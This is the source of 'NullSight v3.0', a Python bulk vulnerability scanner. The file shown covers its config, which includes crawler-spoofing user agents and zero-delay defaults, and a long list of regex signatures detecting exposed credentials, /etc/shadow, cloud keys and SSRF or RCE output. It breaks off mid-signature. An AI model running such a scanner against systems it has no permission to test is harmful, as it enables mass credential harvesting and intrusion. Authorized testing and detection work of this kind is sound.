#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                          ║
║  ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗██╗ ██████╗ ██╗  ██╗████████╗              ║
║  ████╗  ██║██║   ██║██║     ██║     ██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝              ║
║  ██╔██╗ ██║██║   ██║██║     ██║     ███████╗██║██║  ███╗███████║   ██║                 ║
║  ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██║██║   ██║██╔══██║   ██║                 ║
║  ██║ ╚████║╚██████╔╝███████╗███████╗███████║██║╚██████╔╝██║  ██║   ██║                 ║
║  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝               ║
║                                                                                          ║
║        NullSight v3.0 — WORLD-CLASS AUTHORIZED BULK PENETRATION TESTING SCANNER         ║
║        Author: TheDEEP  |  www.thedeep.uz  |  2026                                      ║
║                                                                                          ║
║  MODULE 1 : HTTP Probe Scanner  — 200+ CVE payloads, LFI/RFI chains, SSRF,             ║
║             GraphQL, JWT, XXE, SSTI, deserialization, prototype pollution               ║
║  MODULE 2 : System Service Scanner — Real auth verification:                            ║
║             FTP anonymous login, DB unauthenticated access, Redis/Mongo/MySQL/PG,       ║
║             SMTP open relay, Docker RCE, Kubernetes, VNC, Jupyter, RabbitMQ            ║
║  MODULE 3 : Misconfig Deep Scan — 100+ misconfig patterns across 20+ categories        ║
║                                                                                          ║
║  ENGINE   : Async queue/worker model, zero-copy chunks, adaptive backpressure,          ║
║             per-host rate limiting, DNS cache, connection reuse → MAX RPS               ║
╚══════════════════════════════════════════════════════════════════════════════════════════╝
"""

# ─────────────────────────────────────────────────────────────────────────────
# IMPORTS
# ─────────────────────────────────────────────────────────────────────────────
import asyncio
import aiohttp
import socket
import json
import csv
import time
import random
import re
import sys
import math
import logging
import struct
import ftplib
import hashlib
import base64
from datetime import datetime
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional, Tuple
from urllib.parse import urljoin, urlparse, quote

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import (Progress, SpinnerColumn, BarColumn,
                           TextColumn, TimeElapsedColumn, MofNCompleteColumn)
from rich import box

logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

DISCLAIMER = """
[bold yellow]⚠  DISCLAIMER / OGOHLANTIRISH ⚠[/bold yellow]

Bu tool [bold red]FAQAT[/bold red] ruxsatnoma bilan penetration testing uchun.
• Faqat o'zingizga tegishli yoki yozma ruxsat olgan tizimlarda foydalaning.
• Ruxsatsiz foydalanish O'zbekiston va xalqaro qonunlarni buzadi.
• This tool performs real authentication attempts on discovered services.

[bold cyan]Davom etish uchun YES yozing:[/bold cyan]
"""

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Config:
    concurrency:           int   = 150
    timeout:               int   = 15
    connect_timeout:       int   = 6
    read_timeout:          int   = 12
    max_body_bytes:        int   = 131072    # 128KB
    max_retries:           int   = 2
    queue_maxsize:         int   = 10000
    output_dir:            str   = "NullSight_findings"
    url_file:              str   = "url.txt"
    delay_min:             float = 0.0
    delay_max:             float = 0.0       # zero delay by default for max RPS
    sys_scan_timeout:      int   = 6
    sys_scan_enabled:      bool  = True
    sys_scan_concurrency:  int   = 300       # high concurrency for service scan
    per_host_limit:        int   = 20        # max concurrent per host
    dns_cache_ttl:         int   = 600
    user_agents: list = field(default_factory=lambda: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "curl/8.7.1",
        "python-httpx/0.27.0",
        "Go-http-client/1.1",
        "Wget/1.21.4",
    ])

CONFIG = Config()

# ─────────────────────────────────────────────────────────────────────────────
# CONTENT-TYPE HELPERS
# ─────────────────────────────────────────────────────────────────────────────
JSON_CT = re.compile(r'application/json|text/json', re.I)
HTML_CT = re.compile(r'text/html|application/xhtml', re.I)
XML_CT  = re.compile(r'text/xml|application/xml', re.I)
TEXT_CT = re.compile(r'^text/', re.I)
BIN_EXT = re.compile(
    r'\.(zip|tar\.gz|tar|gz|sql|sqlite3|bak|swp|save|jar|war|hprof|db|dump|7z|rar)$', re.I)

def save_extension(path: str, ct: str, body: bytes) -> str:
    if BIN_EXT.search(path): return ".bin"
    if JSON_CT.search(ct):   return ".json"
    if HTML_CT.search(ct):   return ".html"
    if XML_CT.search(ct):    return ".xml"
    if TEXT_CT.search(ct):   return ".txt"
    stripped = body[:60].strip()
    if stripped.startswith(b"{") or stripped.startswith(b"["): return ".json"
    if stripped.startswith(b"<?xml") or stripped.startswith(b"<root"): return ".xml"
    return ".txt"

# ─────────────────────────────────────────────────────────────────────────────
# ENTROPY
# ─────────────────────────────────────────────────────────────────────────────
def shannon_entropy(s: str) -> float:
    if not s: return 0.0
    freq: dict = {}
    for c in s: freq[c] = freq.get(c, 0) + 1
    length = len(s)
    return -sum((v / length) * math.log2(v / length) for v in freq.values())

def has_high_entropy_secret(text: str, threshold: float = 4.2) -> bool:
    for token in re.findall(r'[A-Za-z0-9+/=_\-]{20,}', text):
        if shannon_entropy(token) >= threshold:
            return True
    return False

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#  SIGNATURES  — CRITICAL + HIGH + MEDIUM (200+ signatures)
#  required_path_pattern: response URL *path* must match (eliminates FP class)
#  html_allowed: False = HTML response rejected immediately
#  js_allowed: True = allow application/javascript responses
# ══════════════════════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Signature:
    name:                  str
    severity:              str
    pattern:               re.Pattern
    min_content_length:    int  = 20
    description:           str  = ""
    is_bytes:              bool = False
    cve:                   str  = ""
    tags:                  list = field(default_factory=list)
    required_path_pattern: Optional[re.Pattern] = None
    html_allowed:          bool = False
    js_allowed:            bool = False
    # Require additional pattern in same response (AND logic)
    require_also:          Optional[re.Pattern] = None

SIGNATURES: list[Signature] = [

    # ══════════════════════════════════════════════════════════
    # ENV / SECRET FILES
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Env file — credentials exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'(?:APP_KEY|APP_SECRET|DB_PASSWORD|DB_PASS|DATABASE_PASSWORD|'
            r'SECRET_KEY|SECRET|AWS_SECRET|AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|'
            r'API_KEY|API_SECRET|TOKEN|ACCESS_TOKEN|AUTH_TOKEN|JWT_SECRET|'
            r'MAIL_PASSWORD|REDIS_PASSWORD|STRIPE_SECRET|STRIPE_KEY|'
            r'TWILIO_AUTH_TOKEN|GITHUB_TOKEN|GOOGLE_API_KEY|PRIVATE_KEY|'
            r'MYSQL_PASSWORD|MYSQL_ROOT_PASSWORD|POSTGRES_PASSWORD|MONGODB_URI|'
            r'DATABASE_URL|PUSHER_APP_SECRET|ENCRYPTION_KEY|PASSWORD_SALT|'
            r'OAUTH_SECRET|OAUTH_CLIENT_SECRET|FIREBASE_KEY|SENDGRID_API_KEY|'
            r'PAYPAL_SECRET|BRAINTREE_PRIVATE_KEY|CLOUDINARY_API_SECRET|'
            r'DIGITALOCEAN_TOKEN|HEROKU_API_KEY|VAULT_TOKEN|'
            r'SONAR_TOKEN|JIRA_TOKEN|CONFLUENCE_TOKEN)\s*=\s*\S+',
            re.I | re.M),
        min_content_length=30,
        description="Credential KEY=VALUE found in env/config file",
        tags=["env", "secret"],
        required_path_pattern=re.compile(
            r'/\.env(?:\.|$|/)|/env$|/\.env~|'
            r'/env\.(?:backup|local|prod|dev|staging|example|test|old|bak|save|2\d{3})$|'
            r'/\.env\.\w+$|/config\.env$',
            re.I),
        html_allowed=False,
    ),
    Signature(
        name="Generic env block (multi-line KEY=VALUE)",
        severity="HIGH",
        pattern=re.compile(
            r'^(?:[A-Za-z_][A-Za-z0-9_]{2,39}=.{2,300}\n){3,}',
            re.M),
        min_content_length=80,
        description="Multiple KEY=VALUE lines — env/config file",
        tags=["env"],
        required_path_pattern=re.compile(
            r'/\.env(?:\.|$|/)|/env$|/\.env~|/config\.env$',
            re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # GIT
    # ══════════════════════════════════════════════════════════
    Signature(
        name=".git/config exposed",
        severity="CRITICAL",
        pattern=re.compile(r'\[core\].*repositoryformatversion', re.S | re.I),
        description="Git repository config — source code cloneable",
        tags=["git", "source-code"],
        required_path_pattern=re.compile(r'/\.git/', re.I),
        html_allowed=False,
    ),
    Signature(
        name=".git/HEAD exposed",
        severity="HIGH",
        pattern=re.compile(r'^ref:\s+refs/heads/', re.M),
        description="Git HEAD reference exposed",
        tags=["git"],
        required_path_pattern=re.compile(r'/\.git/', re.I),
        html_allowed=False,
    ),
    Signature(
        name=".git/COMMIT_EDITMSG exposed",
        severity="MEDIUM",
        pattern=re.compile(r'^\w{7,}|^(feat|fix|chore|refactor|update|merge|add|remove):', re.M | re.I),
        description="Git commit message leaked — repo structure exposed",
        tags=["git"],
        required_path_pattern=re.compile(r'/\.git/COMMIT_EDITMSG', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # LINUX SYSTEM FILES
    # ══════════════════════════════════════════════════════════
    Signature(
        name="/etc/passwd exposed",
        severity="CRITICAL",
        pattern=re.compile(r'root:x:0:0:|nobody:x:\d+:\d+:|www-data:x:\d+|daemon:x:\d+', re.M),
        description="Linux passwd file — LFI confirmed",
        tags=["lfi", "system"],
        html_allowed=False,
    ),
    Signature(
        name="/etc/shadow exposed",
        severity="CRITICAL",
        pattern=re.compile(r'root:\$[0-9a-z$]\$|:\$y\$|:\$6\$|:\$2b\$|:\$1\$', re.M | re.I),
        description="Linux shadow — password hashes exposed",
        tags=["lfi", "system"],
        html_allowed=False,
    ),
    Signature(
        name="proc/self/environ LFI",
        severity="CRITICAL",
        pattern=re.compile(r'PATH=(?:/[^:]+:)+|HOME=/(?:root|home|var|www)|SHELL=(?:/bin|/usr)', re.M),
        min_content_length=40,
        description="Process environment leaked — LFI confirmed",
        tags=["lfi", "rce"],
        html_allowed=False,
    ),
    Signature(
        name="proc/self/cmdline",
        severity="HIGH",
        pattern=re.compile(r'(?:python|php|node|java|ruby|nginx|apache|gunicorn|uwsgi)\x00', re.M),
        description="Process cmdline exposed",
        tags=["lfi"],
        required_path_pattern=re.compile(r'proc/self/cmdline|proc/version|proc/self/maps', re.I),
        html_allowed=False,
    ),
    Signature(
        name="/etc/hosts exposed",
        severity="MEDIUM",
        pattern=re.compile(r'127\.0\.0\.1\s+localhost|::1\s+localhost', re.M),
        description="/etc/hosts file — internal network topology",
        tags=["lfi", "system"],
        html_allowed=False,
    ),
    Signature(
        name="/etc/crontab or cron job exposed",
        severity="HIGH",
        pattern=re.compile(r'SHELL=/bin/(?:bash|sh)|^\*/\d+\s+\*\s+\*\s+\*\s+\*\s+\w+', re.M),
        description="Cron configuration exposed",
        tags=["lfi", "system"],
        html_allowed=False,
    ),
    Signature(
        name="Apache/Nginx config exposed",
        severity="HIGH",
        pattern=re.compile(
            r'ServerName\s+\S+|VirtualHost\s+\*:\d+|'
            r'location\s+/\s*\{|server\s+\{|upstream\s+\w+\s*\{',
            re.M | re.I),
        description="Web server config file exposed",
        tags=["lfi", "misconfig"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # SSH / KEYS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="SSH private key exposed",
        severity="CRITICAL",
        pattern=re.compile(r'-----BEGIN (?:RSA|EC|OPENSSH|DSA|PGP|ENCRYPTED) PRIVATE KEY-----'),
        description="SSH/PGP private key material exposed",
        tags=["ssh", "key"],
        html_allowed=False,
    ),
    Signature(
        name="AWS credentials/key",
        severity="CRITICAL",
        pattern=re.compile(
            r'(?:AKIA|ASIA|AROA|AIDA)[A-Z0-9]{16}|'
            r'aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}',
            re.I),
        description="AWS access key or secret exposed",
        tags=["cloud", "aws"],
        html_allowed=False,
    ),
    Signature(
        name="GCP service account key",
        severity="CRITICAL",
        pattern=re.compile(r'"type"\s*:\s*"service_account".*?"private_key"', re.S | re.I),
        description="Google Cloud service account JSON exposed",
        tags=["cloud", "gcp"],
        html_allowed=False,
    ),
    Signature(
        name="Azure service principal / connection string",
        severity="CRITICAL",
        pattern=re.compile(
            r'DefaultEndpointsProtocol=https;AccountName=|'
            r'"clientSecret"\s*:\s*"[^"]{20,}"|'
            r'AZURE_CLIENT_SECRET\s*=\s*\S+',
            re.I),
        description="Azure credentials/connection string exposed",
        tags=["cloud", "azure"],
        html_allowed=False,
    ),
    Signature(
        name="Service API token (GitHub/Slack/OpenAI/Stripe)",
        severity="HIGH",
        pattern=re.compile(
            r'(?:ghp_|gho_|ghs_|ghr_)[A-Za-z0-9]{36}|'
            r'xox[bpars]-[0-9A-Za-z\-]{10,}|'
            r'sk-[A-Za-z0-9]{40,}|'
            r'sk-proj-[A-Za-z0-9\-_]{40,}|'
            r'rk_live_[A-Za-z0-9]{24}|'
            r'pk_live_[A-Za-z0-9]{24}'),
        description="Service-specific API token exposed",
        tags=["token"],
        html_allowed=False,
    ),
    Signature(
        name="Database connection DSN with credentials",
        severity="HIGH",
        pattern=re.compile(
            r'(?:mysql|postgres|postgresql|mongodb(?:\+srv)?|mssql|redis|'
            r'amqp|jdbc:mysql|jdbc:postgresql|jdbc:sqlserver)://[^:\s@]+:[^@\s]{3,}@[^/\s]+',
            re.I),
        description="Database DSN with embedded credentials",
        tags=["database", "secret"],
        html_allowed=False,
    ),
    Signature(
        name=".aws/credentials exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'\[default\]|aws_access_key_id\s*=|aws_secret_access_key\s*=', re.I),
        description="AWS credentials file exposed",
        tags=["cloud", "aws"],
        required_path_pattern=re.compile(r'\.aws/credentials|aws_credentials', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # PHP LFI WRAPPERS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="PHP LFI base64 leak (php://filter)",
        severity="CRITICAL",
        pattern=re.compile(r'^[A-Za-z0-9+/]{200,}={0,2}$', re.M),
        min_content_length=200,
        description="php://filter base64 — LFI confirmed, source readable",
        tags=["lfi", "php"],
        required_path_pattern=re.compile(r'php://|filter=|resource=', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # LARAVEL
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Laravel APP_KEY exposed",
        severity="CRITICAL",
        pattern=re.compile(r'APP_KEY=base64:[A-Za-z0-9+/=]{40,}', re.M),
        description="Laravel APP_KEY exposed — full decryption/RCE possible",
        cve="CVE-2021-3129",
        tags=["laravel", "secret"],
        html_allowed=False,
    ),
    Signature(
        name="Laravel debug stack trace",
        severity="CRITICAL",
        pattern=re.compile(
            r'Illuminate\\[A-Za-z\\]+Exception|laravel\.log|SymfonyDisplayer|'
            r'"environment"\s*:\s*"(?:local|development)".*?"debug"\s*:\s*true',
            re.I | re.S),
        description="Laravel debug mode — stack traces exposed",
        cve="CVE-2021-3129",
        tags=["laravel", "debug"],
        required_path_pattern=re.compile(
            r'/telescope|/_debugbar|/log-viewer|/horizon|/laravel-filemanager', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # YII2 — STRICT
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Yii2 debug panel exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'yii\s+Debug\s+Toolbar|Yii2\s+Debug\s+Panel|'
            r'"YII_DEBUG"\s*[:=]\s*true|yii\\base\\[A-Za-z]+Exception',
            re.I),
        description="Yii2 debug panel — application internals exposed",
        tags=["yii", "debug"],
        required_path_pattern=re.compile(
            r'/debug/default/view|/index\.php\?r=debug|/_debug|/yii2-debug', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # DJANGO
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Django DEBUG=True page",
        severity="CRITICAL",
        pattern=re.compile(
            r"You're seeing this error because you have DEBUG = True|"
            r'Django\s+Version:\s+\d|SECRET_KEY\s*=\s*[\'"][^\'"]{20,}[\'"]',
            re.I),
        description="Django DEBUG mode — settings exposed",
        tags=["django", "debug"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # SPRING BOOT ACTUATOR
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Spring Boot actuator /env exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'"activeProfiles"|"propertySources".*?"source"|'
            r'"spring\.datasource\.password"|"spring\.mail\.password"|'
            r'"spring\.security\.user\.password"',
            re.I | re.S),
        description="Spring Boot /actuator/env — credentials in properties",
        cve="CVE-2022-22965",
        tags=["spring", "actuator"],
        required_path_pattern=re.compile(r'/actuator/', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Spring Boot actuator beans/mappings",
        severity="HIGH",
        pattern=re.compile(r'"beans":\[|"mappings":\{|"dispatcherServlets"', re.I),
        description="Spring Boot actuator endpoint exposed",
        tags=["spring", "actuator"],
        required_path_pattern=re.compile(r'/actuator/', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Spring Boot heap dump",
        severity="CRITICAL",
        pattern=re.compile(rb'JAVA PROFILE \d\.\d|HPROF|java\.lang\.Object', re.I),
        min_content_length=50,
        description="Spring Boot heap dump — memory contents exposed",
        is_bytes=True,
        tags=["spring", "java"],
        required_path_pattern=re.compile(r'/actuator/heapdump', re.I),
    ),
    Signature(
        name="Spring Boot RCE (CVE-2022-22965 Log4Shell chain)",
        severity="CRITICAL",
        pattern=re.compile(r'uid=\d+\(|/etc/passwd|java\.lang\.Runtime', re.I),
        description="Spring Boot RCE via Spring4Shell — command execution confirmed",
        cve="CVE-2022-22965",
        tags=["spring", "rce"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # JENKINS / CI-CD
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Jenkins credentials.xml exposed",
        severity="CRITICAL",
        pattern=re.compile(r'<com\.cloudbees\.plugins\.credentials|<hudson\.util\.Secret>', re.I),
        description="Jenkins credentials.xml — credentials readable",
        tags=["jenkins", "cicd"],
        required_path_pattern=re.compile(r'credentials\.xml|/jenkins/', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Jenkins /script console exposed",
        severity="CRITICAL",
        pattern=re.compile(r'Groovy Script|<form.*?/script.*?execute|Script Console', re.I | re.S),
        description="Jenkins script console — direct Groovy RCE",
        tags=["jenkins", "rce"],
        required_path_pattern=re.compile(r'/script$|/scriptText', re.I),
        html_allowed=True,
    ),
    Signature(
        name="TeamCity REST API exposed",
        severity="HIGH",
        pattern=re.compile(r'"buildTypeId"|"projectId"|"agentId"', re.I),
        description="JetBrains TeamCity REST API exposed",
        cve="CVE-2024-27198",
        tags=["teamcity", "cicd"],
        required_path_pattern=re.compile(r'/app/rest/', re.I),
        html_allowed=False,
    ),
    Signature(
        name="GitLab CI variable exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'CI_JOB_TOKEN|CI_REGISTRY_PASSWORD|GITLAB_TOKEN|'
            r'"variable_type"\s*:\s*"env_var"', re.I),
        description="GitLab CI environment variable exposed",
        tags=["gitlab", "cicd", "secret"],
        html_allowed=False,
    ),
    Signature(
        name="GitHub Actions workflow secret ref",
        severity="HIGH",
        pattern=re.compile(r'\$\{\{\s*secrets\.\w+\s*\}\}|\$\{\{\s*github\.token\s*\}\}', re.I),
        description="GitHub Actions secrets reference in workflow output",
        tags=["github", "cicd", "secret"],
        html_allowed=False,
    ),
    Signature(
        name="CircleCI config exposed",
        severity="HIGH",
        pattern=re.compile(r'version:\s*[23]\njobs:|orbs:|executors:', re.M | re.I),
        description="CircleCI pipeline config — potential secret leak",
        tags=["circleci", "cicd"],
        required_path_pattern=re.compile(r'\.circleci|config\.yml', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # SSRF CLOUD METADATA
    # ══════════════════════════════════════════════════════════
    Signature(
        name="AWS metadata SSRF confirmed",
        severity="CRITICAL",
        pattern=re.compile(
            r'"Code"\s*:\s*"Success".*?"AccessKeyId"|'
            r'ami-[a-f0-9]{8,17}|'
            r'"instanceId"\s*:\s*"i-[a-f0-9]{8,17}"',
            re.I | re.S),
        description="AWS IMDSv1 metadata — SSRF confirmed",
        tags=["ssrf", "cloud", "aws"],
        html_allowed=False,
    ),
    Signature(
        name="GCP metadata SSRF confirmed",
        severity="CRITICAL",
        pattern=re.compile(
            r'"computeMetadata".*?"serviceAccounts"|metadata\.google\.internal',
            re.I | re.S),
        description="GCP metadata server — SSRF confirmed",
        tags=["ssrf", "cloud", "gcp"],
        html_allowed=False,
    ),
    Signature(
        name="Azure metadata SSRF confirmed",
        severity="CRITICAL",
        pattern=re.compile(r'"subscriptionId".*?"resourceGroupName"', re.I | re.S),
        description="Azure IMDS — SSRF confirmed",
        tags=["ssrf", "cloud", "azure"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # GRAPHQL
    # ══════════════════════════════════════════════════════════
    Signature(
        name="GraphQL introspection enabled",
        severity="HIGH",
        pattern=re.compile(r'"__schema"\s*:\s*\{.*?"types"', re.S | re.I),
        description="GraphQL introspection — full schema dump possible",
        tags=["graphql"],
        required_path_pattern=re.compile(r'/graphql|/graphiql|/playground|/api/graphql', re.I),
        html_allowed=False,
    ),
    Signature(
        name="GraphQL mutations exposed without auth",
        severity="HIGH",
        pattern=re.compile(r'"mutationType"\s*:\s*\{|"Mutation"\s*:\s*\{', re.I | re.S),
        description="GraphQL mutation operations exposed — data modification possible",
        tags=["graphql", "auth"],
        required_path_pattern=re.compile(r'/graphql|/api/graphql', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # JWT
    # ══════════════════════════════════════════════════════════
    Signature(
        name="JWT alg:none accepted",
        severity="CRITICAL",
        pattern=re.compile(r'"alg"\s*:\s*"none"', re.I),
        description="JWT alg:none accepted — authentication bypass",
        tags=["jwt", "auth"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # XXE / XML INJECTION
    # ══════════════════════════════════════════════════════════
    Signature(
        name="XXE file read confirmed",
        severity="CRITICAL",
        pattern=re.compile(
            r'root:x:0:0:|'
            r'\[general entities\]|'
            r'<!ENTITY\s+\w+\s+SYSTEM|'
            r'file:///etc/passwd',
            re.I),
        description="XXE injection — file read or SSRF confirmed",
        tags=["xxe", "lfi"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # SSTI (Server-Side Template Injection)
    # ══════════════════════════════════════════════════════════
    Signature(
        name="SSTI confirmed — math expression evaluated",
        severity="CRITICAL",
        pattern=re.compile(r'(?<!\d)7777777(?!\d)|(?<!\d)49(?!\d)\s*(?:$|\n)|result.*?49', re.M | re.I),
        description="SSTI math probe evaluated — template injection confirmed",
        tags=["ssti", "rce"],
        html_allowed=True,
    ),
    Signature(
        name="SSTI Jinja2/Twig RCE",
        severity="CRITICAL",
        pattern=re.compile(r'uid=\d+\(|/etc/passwd|subprocess|os\.system', re.I),
        description="SSTI RCE payload executed — Jinja2/Twig confirmed",
        tags=["ssti", "rce"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # WORDPRESS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="WordPress wp-config.php source",
        severity="CRITICAL",
        pattern=re.compile(
            r"define\s*\(\s*'DB_PASSWORD'\s*,\s*'[^']+'\s*\)|"
            r"define\s*\(\s*'AUTH_KEY'\s*,\s*'[^']+'\s*\)",
            re.I),
        description="WordPress wp-config.php source exposed",
        tags=["wordpress", "secret"],
        required_path_pattern=re.compile(r'wp-config', re.I),
        html_allowed=False,
    ),
    Signature(
        name="WordPress user enumeration via REST",
        severity="MEDIUM",
        pattern=re.compile(r'"id":\d+,"name":"[^"]+","slug":"[^"]+","link":"[^"]+"', re.I),
        description="WordPress user list via /wp-json/wp/v2/users",
        tags=["wordpress", "enum"],
        required_path_pattern=re.compile(r'/wp-json/wp/v2/users', re.I),
        html_allowed=False,
    ),
    Signature(
        name="WordPress xmlrpc enabled",
        severity="MEDIUM",
        pattern=re.compile(r'<methodResponse>|<?xml.*?xmlrpc', re.I | re.S),
        description="WordPress XML-RPC enabled — brute force/SSRF vector",
        tags=["wordpress", "xmlrpc"],
        required_path_pattern=re.compile(r'xmlrpc\.php', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # CONTAINER / K8s
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Docker/K8s secrets file",
        severity="CRITICAL",
        pattern=re.compile(
            r'POSTGRES_PASSWORD:|MYSQL_ROOT_PASSWORD:|MONGO_INITDB_ROOT_PASSWORD:|'
            r'kind:\s*Secret\b|RABBITMQ_DEFAULT_PASS:',
            re.I),
        description="Container/Kubernetes secrets exposed",
        tags=["docker", "k8s", "secret"],
        required_path_pattern=re.compile(
            r'docker-compose|kubernetes|k8s/secrets|\.dockerenv', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Kubernetes API namespaces exposed",
        severity="CRITICAL",
        pattern=re.compile(r'"apiVersion"\s*:\s*"v1".*?"kind"\s*:\s*"NamespaceList"', re.I | re.S),
        description="Kubernetes API — cluster namespace list accessible",
        tags=["k8s", "auth"],
        html_allowed=False,
    ),
    Signature(
        name="Docker daemon API exposed",
        severity="CRITICAL",
        pattern=re.compile(r'"ApiVersion"\s*:|"MinAPIVersion"\s*:|"DockerRootDir"', re.I),
        description="Docker daemon API — container/host full control",
        tags=["docker", "rce"],
        required_path_pattern=re.compile(r'/version$|/containers/json|/images/json', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # ELASTICSEARCH / KIBANA
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Elasticsearch cluster exposed",
        severity="HIGH",
        pattern=re.compile(r'"cluster_name"\s*:|"number_of_nodes"\s*:\s*\d', re.I),
        description="Elasticsearch cluster info — unauthenticated",
        tags=["elasticsearch"],
        required_path_pattern=re.compile(r'/_cat/|/_cluster/|/_nodes|/_all|/_search', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Elasticsearch index data exposed",
        severity="CRITICAL",
        pattern=re.compile(r'"_index"\s*:.*?"_source"\s*:\s*\{', re.I | re.S),
        description="Elasticsearch — actual document data accessible",
        tags=["elasticsearch", "data"],
        html_allowed=False,
    ),
    Signature(
        name="Kibana dashboard exposed",
        severity="HIGH",
        pattern=re.compile(r'"kibana":"[^"]+"|"version"\s*:.*?"number"\s*:.*?"buildFlavor"', re.I | re.S),
        description="Kibana dashboard — unauthenticated access",
        tags=["kibana", "elasticsearch"],
        required_path_pattern=re.compile(r'/api/status|/app/kibana', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # NGINX STATUS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Nginx stub_status exposed",
        severity="HIGH",
        pattern=re.compile(r'Active connections:\s+\d+|server accepts handled requests', re.I),
        description="Nginx stub_status — server stats exposed",
        tags=["nginx"],
        required_path_pattern=re.compile(r'/nginx_status|/status$', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # phpinfo
    # ══════════════════════════════════════════════════════════
    Signature(
        name="phpinfo() exposed",
        severity="HIGH",
        pattern=re.compile(
            r'PHP Version\s*(?:</td>|</b>|\s)\s*\d\.\d|<td class="e">disable_functions', re.I),
        description="phpinfo() — full server config exposed",
        tags=["php"],
        required_path_pattern=re.compile(r'phpinfo\.php|info\.php', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # VITE @fs bypass
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Vite @fs path traversal (CVE-2024-23331 / CVE-2025-30208)",
        severity="CRITICAL",
        pattern=re.compile(
            r'root:x:0:0:|APP_KEY=|APP_SECRET=|DB_PASSWORD=|'
            r'-----BEGIN (?:RSA|OPENSSH) PRIVATE KEY-----|PATH=(?:/[^:]+:)+',
            re.I | re.M),
        description="Vite @fs bypass — arbitrary file read confirmed",
        cve="CVE-2024-23331",
        tags=["vite", "lfi"],
        required_path_pattern=re.compile(r'/@fs/', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # APACHE PATH TRAVERSAL
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Apache path traversal RCE (CVE-2021-41773/42013)",
        severity="CRITICAL",
        pattern=re.compile(r'root:x:0:0:|uid=\d+\(\w+\)', re.I),
        description="Apache CVE-2021-41773 — path traversal/RCE confirmed",
        cve="CVE-2021-41773",
        tags=["apache", "lfi", "rce"],
        required_path_pattern=re.compile(r'\.%2e|%2e%2e|%%32%65', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # RCE COMMAND OUTPUT
    # ══════════════════════════════════════════════════════════
    Signature(
        name="RCE — command output confirmed",
        severity="CRITICAL",
